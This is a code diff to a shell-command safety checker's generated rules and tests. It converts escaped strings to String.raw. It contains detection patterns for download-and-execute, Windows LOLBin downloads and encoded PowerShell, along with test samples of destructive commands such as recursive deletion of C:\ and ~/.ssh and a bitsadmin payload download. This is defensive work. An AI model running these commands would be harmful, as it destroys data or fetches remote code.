 				"This runs shell code that shellfirm cannot see before it runs (input lines executed as commands, as in `xargs -I{} sh -c '{}'`), so it cannot be checked.",
 			feed: "raw",
-			regex: "^shellfirm-unknown-shell-payload\\s",
+			regex: String.raw`^shellfirm-unknown-shell-payload\s`,
 			flags: "",
 			filters: [],
 		},
@@ -1062,7 +1062,7 @@ export const GENERATED = {
 				"This downloads a PowerShell script and runs it (Invoke-Expression) without inspection.",
 			feed: "raw",
 			regex:
-				"(?:^|\\s|\\()(?:irm|iwr|Invoke-RestMethod|Invoke-WebRequest|curl|wget)\\b[^;\\n]*\\|\\s*(?:(?:iex|Invoke-Expression)\\b|(?:pwsh|powershell)(?:\\.exe)?\\s+-(?:\\s|$))|(?:^|\\s)(?:iex|Invoke-Expression)\\s*\\$?\\(?\\s*\\(?\\s*(?:irm|iwr|Invoke-RestMethod|Invoke-WebRequest|New-Object\\s+(?:System\\.)?Net\\.WebClient|\\[(?:System\\.)?Net\\.WebClient\\])\\b|\\.Download(?:String|Data)\\s*\\(|\\[scriptblock\\]::Create\\s*\\(",
+				String.raw`(?:^|\s|\()(?:irm|iwr|Invoke-RestMethod|Invoke-WebRequest|curl|wget)\b[^;\n]*\|\s*(?:(?:iex|Invoke-Expression)\b|(?:pwsh|powershell)(?:\.exe)?\s+-(?:\s|$))|(?:^|\s)(?:iex|Invoke-Expression)\s*\$?\(?\s*\(?\s*(?:irm|iwr|Invoke-RestMethod|Invoke-WebRequest|New-Object\s+(?:System\.)?Net\.WebClient|\[(?:System\.)?Net\.WebClient\])\b|\.Download(?:String|Data)\s*\(|\[scriptblock\]::Create\s*\(`,
 			flags: "i",
 			filters: [],
 		},
@@ -1073,7 +1073,7 @@ export const GENERATED = {
 				"This uses a Windows built-in tool (certutil, bitsadmin, mshta or regsvr32) to download and run code from a URL, bypassing normal download controls.",
 			feed: "raw",
 			regex:
-				"(?:^|\\s)(?:certutil(?:\\.exe)?\\s+(?:[-/]\\S+\\s+)*?[-/](?:urlcache|verifyctl)\\b|bitsadmin(?:\\.exe)?\\s+(?:\\S+\\s+)*?\\/transfer\\b|mshta(?:\\.exe)?\\s+(?:https?|javascript|vbscript):|regsvr32(?:\\.exe)?\\s+(?:\\/\\S+\\s+)*?\\/i:https?:)",
+				String.raw`(?:^|\s)(?:certutil(?:\.exe)?\s+(?:[-/]\S+\s+)*?[-/](?:urlcache|verifyctl)\b|bitsadmin(?:\.exe)?\s+(?:\S+\s+)*?\/transfer\b|mshta(?:\.exe)?\s+(?:https?|javascript|vbscript):|regsvr32(?:\.exe)?\s+(?:\/\S+\s+)*?\/i:https?:)`,
 			flags: "i",
 			filters: [],
 		},
@@ -1084,7 +1084,7 @@ export const GENERATED = {
 				"This runs a PowerShell command hidden in base64 (-EncodedCommand), so you cannot see what it does.",
 			feed: "raw",
 			regex:
-				"(?:^|\\s)(?:pwsh|powershell)(?:\\.exe)?\\s+(?:\\S+\\s+)*?[-/]e(?:c|n(?:c(?:o(?:d(?:e(?:d(?:c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?)?)?)?)?)?)?)?[:\\s=]+[A-Za-z0-9+/=]{8,}(?:\\s|$)",
+				String.raw`(?:^|\s)(?:pwsh|powershell)(?:\.exe)?\s+(?:\S+\s+)*?[-/]e(?:c|n(?:c(?:o(?:d(?:e(?:d(?:c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?)?)?)?)?)?)?)?[:\s=]+[A-Za-z0-9+/=]{8,}(?:\s|$)`,
 			flags: "i",
 			filters: [],
 		},
@@ -1095,7 +1095,7 @@ export const GENERATED = {
 				"`--force-with-lease` still overwrites the remote's history when the remote matches what you last fetched.",
 			feed: "parsed",
 			regex:
-				"^git(?:\\s+(?:-[Cc]|--git-dir|--work-tree|--namespace|--super-prefix|--config-env)\\s+\\S+|\\s+-\\S+)*\\s+push\\s(?!.*\\s(?:-n|--dry-run)(?:\\s|$))(?:.*\\s)?--force-with-lease(?:=\\S*)?(?:\\s|$)",
+				String.raw`^git(?:\s+(?:-[Cc]|--git-dir|--work-tree|--namespace|--super-prefix|--config-env)\s+\S+|\s+-\S+)*\s+push\s(?!.*\s(?:-n|--dry-run)(?:\s|$))(?:.*\s)?--force-with-lease(?:=\S*)?(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -1105,7 +1105,7 @@ export const GENERATED = {
 			description: "This writes to a system folder.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)(?:>>?\\|?|&>|tee(?:\\s+-\\S+)*)\\s*(?:\\S+\\s+)*?\\/(?:etc|usr|bin|sbin|boot|System|Library)(?:\\/|\\s|$)",
+				String.raw`(?:^|\s)(?:>>?\|?|&>|tee(?:\s+-\S+)*)\s*(?:\S+\s+)*?\/(?:etc|usr|bin|sbin|boot|System|Library)(?:\/|\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -1116,7 +1116,7 @@ export const GENERATED = {
 				"A recursive delete of the home directory written as `~/`, which the upstream rule reads only as `~`.",
 			feed: "parsed",
 			regex:
-				"^rm\\s(?:.*\\s)?(?:-\\S*[rR]\\S*|--recursive)\\s(?:.*\\s)?~\\/(?:\\s|$)",
+				String.raw`^rm\s(?:.*\s)?(?:-\S*[rR]\S*|--recursive)\s(?:.*\s)?~\/(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -1127,7 +1127,7 @@ export const GENERATED = {
 				"Piping a download into a shell runs it unread; upstream names only bare `bash`, `sh`, `zsh` and `fish`.",
 			feed: "raw",
 			regex:
-				"(?:^|\\s)(?:curl|wget)\\s+.*\\|\\s*(?:sudo\\s+(?:-\\S+\\s+)*|env\\s+(?:-\\S+\\s+)*|exec\\s+)?(?:\\S*\\/)?(?:bash|sh|zsh|fish|dash|ksh|ash)(?:\\s|$)",
+				String.raw`(?:^|\s)(?:curl|wget)\s+.*\|\s*(?:sudo\s+(?:-\S+\s+)*|env\s+(?:-\S+\s+)*|exec\s+)?(?:\S*\/)?(?:bash|sh|zsh|fish|dash|ksh|ash)(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -1138,7 +1138,7 @@ export const GENERATED = {
 				"A linter's unsafe fixes can change what the code does, and one deleted working code. Run the safe `--fix`, read each remaining suggestion, and apply it with Edit.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)(?:\\S*\\/)?(?:oxlint|biome|ruff)\\s(?:.*\\s)?(?:--fix-suggestions|--fix-dangerously|--unsafe|--unsafe-fixes)(?:=\\S*)?(?:\\s|$)",
+				String.raw`(?:^|\s)(?:\S*\/)?(?:oxlint|biome|ruff)\s(?:.*\s)?(?:--fix-suggestions|--fix-dangerously|--unsafe|--unsafe-fixes)(?:=\S*)?(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -3021,7 +3021,7 @@ export const GENERATED = {
 			expect_ids: ["fs:windows_recursive_delete"],
 		},
 		{
-			test: "rd /q C:\\ /s",
+			test: String.raw`rd /q C:\ /s`,
 			expect_ids: ["fs:windows_recursive_delete"],
 		},
 		{
@@ -3029,7 +3029,7 @@ export const GENERATED = {
 			expect_ids: ["fs:windows_recursive_delete"],
 		},
 		{
-			test: 'rd /s /q "C:\\Users"',
+			test: String.raw`rd /s /q "C:\Users"`,
 			expect_ids: ["fs:windows_recursive_delete"],
 		},
 		{
@@ -3037,23 +3037,23 @@ export const GENERATED = {
 			expect_ids: ["fs:windows_recursive_delete"],
 		},
 		{
-			test: "del /s /q /f C:\\*",
+			test: String.raw`del /s /q /f C:\*`,
 			expect_ids: ["fs:windows_recursive_delete"],
 		},
 		{
-			test: "rd /s /q C:\\Windows\\System32",
+			test: String.raw`rd /s /q C:\Windows\System32`,
 			expect_ids: ["fs:windows_recursive_delete"],
 		},
 		{
-			test: "rd /s /q .\\dist",
+			test: String.raw`rd /s /q .\dist`,
 			expect_ids: [],
 		},
 		{
-			test: "rd /s /q C:\\Users\\dev\\project\\dist",
+			test: String.raw`rd /s /q C:\Users\dev\project\dist`,
 			expect_ids: [],
 		},
 		{
-			test: "del /q C:\\temp\\build.log",
+			test: String.raw`del /q C:\temp\build.log`,
 			expect_ids: [],
 		},
 		{
@@ -3065,7 +3065,7 @@ export const GENERATED = {
 			expect_ids: ["fs:windows_remove_item_recursive"],
 		},
 		{
-			test: "ri -r -fo C:\\Users\\dev",
+			test: String.raw`ri -r -fo C:\Users\dev`,
 			expect_ids: ["fs:windows_remove_item_recursive"],
 		},
 		{
@@ -3073,15 +3073,15 @@ export const GENERATED = {
 			expect_ids: ["fs:windows_remove_item_recursive"],
 		},
 		{
-			test: "Remove-Item -Recurse -Force .\\dist",
+			test: String.raw`Remove-Item -Recurse -Force .\dist`,
 			expect_ids: [],
 		},
 		{
-			test: "Remove-Item -Force C:\\temp\\build.log",
+			test: String.raw`Remove-Item -Force C:\temp\build.log`,
 			expect_ids: [],
 		},
 		{
-			test: 'Remove-Item -Recurse -Force "$env:TEMP\\build"',
+			test: String.raw`Remove-Item -Recurse -Force "$env:TEMP\build"`,
 			expect_ids: [],
 		},
 		{
@@ -3117,27 +3117,27 @@ export const GENERATED = {
 			expect_ids: ["fs:windows_format_drive"],
 		},
 		{
-			test: 'powershell.exe -Command "Remove-Item -Recurse -Force C:\\"',
+			test: String.raw`powershell.exe -Command "Remove-Item -Recurse -Force C:\"`,
 			expect_ids: ["fs:windows_remove_item_recursive"],
 		},
 		{
-			test: 'pwsh.exe -c "Remove-Item -Recurse -Force D:\\"',
+			test: String.raw`pwsh.exe -c "Remove-Item -Recurse -Force D:\"`,
 			expect_ids: ["fs:windows_remove_item_recursive"],
 		},
 		{
-			test: 'powershell -NoProfile "Remove-Item -Recurse -Force C:\\Users\\dev"',
+			test: String.raw`powershell -NoProfile "Remove-Item -Recurse -Force C:\Users\dev"`,
 			expect_ids: ["fs:windows_remove_item_recursive"],
 		},
 		{
-			test: 'powershell -ExecutionPolicy Bypass "rd /s /q C:\\"',
+			test: String.raw`powershell -ExecutionPolicy Bypass "rd /s /q C:\"`,
 			expect_ids: ["fs:windows_recursive_delete"],
 		},
 		{
-			test: 'cmd /c"rd /s /q D:\\"',
+			test: String.raw`cmd /c"rd /s /q D:\"`,
 			expect_ids: ["fs:windows_recursive_delete"],
 		},
 		{
-			test: "Remove-Item -Path:C:\\Users\\dev -Recurse -Force",
+			test: String.raw`Remove-Item -Path:C:\Users\dev -Recurse -Force`,
 			expect_ids: ["fs:windows_remove_item_recursive"],
 		},
 		{
@@ -3149,11 +3149,11 @@ export const GENERATED = {
 			expect_ids: ["fs:windows_remove_item_recursive"],
 		},
 		{
-			test: "Remove-Item -Recurse -Force ~\\*",
+			test: String.raw`Remove-Item -Recurse -Force ~\*`,
 			expect_ids: ["fs:windows_remove_item_recursive"],
 		},
 		{
-			test: "Remove-Item -Recurse -Force $HOME\\*",
+			test: String.raw`Remove-Item -Recurse -Force $HOME\*`,
 			expect_ids: ["fs:windows_remove_item_recursive"],
 		},
 		{
@@ -3165,19 +3165,19 @@ export const GENERATED = {
 			expect_ids: ["fs:windows_remove_item_recursive"],
 		},
 		{
-			test: "rd /s /q C:\\Users\\dev\\Documents",
+			test: String.raw`rd /s /q C:\Users\dev\Documents`,
 			expect_ids: ["fs:windows_recursive_delete"],
 		},
 		{
-			test: "Remove-Item -Recurse -Force C:\\Users\\dev\\.ssh",
+			test: String.raw`Remove-Item -Recurse -Force C:\Users\dev\.ssh`,
 			expect_ids: ["fs:windows_remove_item_recursive"],
 		},
 		{
-			test: "Get-ChildItem C:\\ -Recurse | Remove-Item -Force",
+			test: String.raw`Get-ChildItem C:\ -Recurse | Remove-Item -Force`,
 			expect_ids: ["fs:windows_pipeline_delete"],
 		},
 		{
-			test: "gci C:\\Users\\dev | ri -Recurse -Force",
+			test: String.raw`gci C:\Users\dev | ri -Recurse -Force`,
 			expect_ids: ["fs:windows_pipeline_delete"],
 		},
 		{
@@ -3201,23 +3201,23 @@ export const GENERATED = {
 			expect_ids: [],
 		},
 		{
-			test: "rd /s /q .\\dist",
+			test: String.raw`rd /s /q .\dist`,
 			expect_ids: [],
 		},
 		{
-			test: "rd /s /q C:\\Users\\dev\\project\\dist",
+			test: String.raw`rd /s /q C:\Users\dev\project\dist`,
 			expect_ids: [],
 		},
 		{
-			test: "Remove-Item -Recurse -Force .\\dist",
+			test: String.raw`Remove-Item -Recurse -Force .\dist`,
 			expect_ids: [],
 		},
 		{
-			test: "Remove-Item -Recurse:$false C:\\x",
+			test: String.raw`Remove-Item -Recurse:$false C:\x`,
 			expect_ids: [],
 		},
 		{
-			test: "Get-ChildItem .\\dist | Remove-Item -Recurse",
+			test: String.raw`Get-ChildItem .\dist | Remove-Item -Recurse`,
 			expect_ids: [],
 		},
 		{
@@ -3241,7 +3241,7 @@ export const GENERATED = {
 			expect_ids: ["fs:windows_recursive_delete"],
 		},
 		{
-			test: "del/f/s/q C:\\*",
+			test: String.raw`del/f/s/q C:\*`,
 			expect_ids: ["fs:windows_recursive_delete"],
 		},
 		{
@@ -3253,11 +3253,11 @@ export const GENERATED = {
 			expect_ids: ["fs:windows_pipeline_delete"],
 		},
 		{
-			test: "Get-ChildItem C:\\ -Recurse | Remove-Item -ErrorAction SilentlyContinue",
+			test: String.raw`Get-ChildItem C:\ -Recurse | Remove-Item -ErrorAction SilentlyContinue`,
 			expect_ids: ["fs:windows_pipeline_delete"],
 		},
 		{
-			test: "gci .\\dist | ri; cd ~",
+			test: String.raw`gci .\dist | ri; cd ~`,
 			expect_ids: [],
 		},
 		{
@@ -3861,7 +3861,7 @@ export const GENERATED = {
 			expect_ids: ["fs:parted_disk_modify"],
 		},
 		{
-			test: "printf 'rm 1\\nquit\\n' | parted /dev/sdb",
+			test: String.raw`printf 'rm 1\nquit\n' | parted /dev/sdb`,
 			expect_ids: ["fs:parted_disk_modify"],
 		},
 		{
@@ -4097,7 +4097,7 @@ export const GENERATED = {
 			expect_ids: [],
 		},
 		{
-			test: "printf '%s\\n' 'run: sudo make install' >> docs/install.md && rm -rf node_modules",
+			test: String.raw`printf '%s\n' 'run: sudo make install' >> docs/install.md && rm -rf node_modules`,
 			expect_ids: [],
 		},
 		{
@@ -5345,7 +5345,7 @@ export const GENERATED = {
 			expect_ids: [],
 		},
 		{
-			test: "printf 'git push -f\\n' | bash",
+			test: String.raw`printf 'git push -f\n' | bash`,
 			expect_ids: ["git:force_push"],
 		},
 		{
@@ -5497,7 +5497,7 @@ export const GENERATED = {
 			expect_ids: ["shell:lolbin_download_exec"],
 		},
 		{
-			test: "bitsadmin /transfer job https://x.example/a.exe C:\\a.exe",
+			test: String.raw`bitsadmin /transfer job https://x.example/a.exe C:\a.exe`,
 			expect_ids: ["shell:lolbin_download_exec"],
 		},
 		{
